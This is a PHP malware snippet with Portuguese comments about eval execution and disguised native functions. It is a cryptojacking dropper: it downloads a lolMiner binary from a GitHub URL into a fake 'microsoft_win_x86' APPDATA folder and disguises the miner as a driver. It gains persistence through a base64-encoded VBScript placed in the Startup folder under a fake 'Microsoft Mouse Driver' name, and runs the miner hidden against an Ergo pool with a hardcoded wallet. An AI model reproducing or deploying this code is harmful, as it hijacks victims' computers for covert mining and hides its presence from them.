execução por eval. cuidado, não use exit e nem __FILE__
cuidado ao chamar funções nativas pois elas estao camufladas

[GIT_COMMAND]

$GLOBALS['__download_002'] = function($url)
{
	try
	{
		$header = array(
			'Cache-Control: max-age=0',
			'Connection: keep-alive',
			'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
		);
		clearstatcache();
		$ch = curl_init(); 
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0' );
		curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connTimeout);
		curl_setopt($ch, CURLOPT_TIMEOUT, $curlTimeout);
		$response = @curl_exec($ch);
		return $response;
		
	}catch( Exception $e ){}
	return false;
};

$lolm_path = getenv('APPDATA') . '\\microsoft_win_x86';
@mkdir($lolm_path);
$id_com = $lolm_path . '\\com_key.dat';
$id_path = $lolm_path . '\\work_key.dat';
$work_key = @file_get_contents($id_path);
if(!$work_key)
{
	$work_key = md5(microtime().mt_rand(0,9999).mt_rand(0,9999).mt_rand(0,9999));
	@file_put_contents($id_path, $work_key);
}
$work_key = trim($work_key);
$command_id = '000036';
if(@file_get_contents($id_com) !== $command_id)
{
	@file_put_contents($id_com, $command_id);
	try{
	$lolm_path .= '\\w_driver1.95_x86.exe';
	$data = true;
	if(!is_file($lolm_path))
	{
		$data = false;
		$data = $GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner_1.95.dat');
		if($data && strlen($data) > 11000)
			@file_put_contents($lolm_path, $data);
		else
			$data = false;
	}
	if($data !== false)
	{
		
		$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCmZuID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KbiA9IFNwbGl0KGZuLCAiLiIpDQpjID0gQ0RibChuKDEpKQ0KV2hpbGUgVHJ1ZQ0KCWMgPSBjICsgMQ0KCW5uID0gbigwKSAmICIuIiAmIGMgJiAiLiIgJiBuKDIpICYgIi52YnMiDQoJZnNvLk1vdmVGaWxlIGZuLCBubg0KCWZuID0gbm4NCglXU2NyaXB0LlNsZWVwKHtUSU1FT1VUfSkNCldlbmQ';
		$vbs_checkname = 'Microsoft Mouse Driver x86';
		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
		$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.' --watchdog exit --apiport 8020 --nocolor';
		$command = preg_replace('/\"/is', '""', $command);
		$vbs = base64_decode($vbs);
		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
		$vbs = preg_replace('/\{TIMEOUT\}/is', (string)(mt_rand(1000*60*1, 1000*60*5)), $vbs);
		$vbs_path = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
		if(is_dir($vbs_path))
		{
			@exec('taskkill /f /im w_driver_x86.exe');
			@exec('taskkill /f /im w_driverx86.exe');
			@exec('taskkill /f /im ' . $vbsname);
			$count_files = 0;
			$di = new DirectoryIterator($vbs_path);
			unset($data);
			foreach($di as $data)
			{
				if($data->isDot() || $data->isDir() || !$data->isFile())
					continue;
				if(stripos($data->getFilename(), $vbs_checkname) === false)
					continue;
				$count_files++;
				if($count_files == 1)
				{
					@file_put_contents($data->getPathname(), $vbs);
					@exec('start "" "'.$data->getPathname().'"');
				}
				else
					@unlink($data->getPathname());
			}
			if($count_files == 0)
			{
				@file_put_contents($vbs_path.'\\'.$vbsname, $vbs);
				@exec('start "" "'.$vbs_path.'\\'.$vbsname.'"');
			}
		}
	}
	}catch(Exception $e){}
}

[/GIT_COMMAND]
